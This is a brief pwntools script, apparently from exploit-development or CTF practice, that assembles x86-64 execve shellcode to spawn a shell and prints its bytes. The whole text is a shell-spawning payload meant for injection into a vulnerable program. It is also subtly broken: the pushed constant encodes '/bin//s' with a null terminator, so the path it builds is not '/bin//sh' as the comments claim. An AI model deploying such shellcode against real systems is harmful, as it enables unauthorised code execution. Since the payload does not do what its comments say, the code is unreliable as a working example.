from pwn import *

# Generate shellcode
context.arch = 'amd64'
shellcode = asm('''
    /* Push /bin//sh onto stack (using shorter instructions) */
    push 0x68
    mov rax, 0x732f2f6e69622f
    push rax
    mov rdi, rsp    /* First arg: pointer to /bin//sh */

    /* Clear rsi (argv = NULL) and rdx (envp = NULL) */
    xor esi, esi
    xor edx, edx

    /* Call execve syscall (59) */
    push 59
    pop rax
    syscall
''')

print("Shellcode length:", len(shellcode))
print("Shellcode hex:", shellcode.hex())
print("Raw shellcode:", repr(shellcode))

# Test shellcode locally
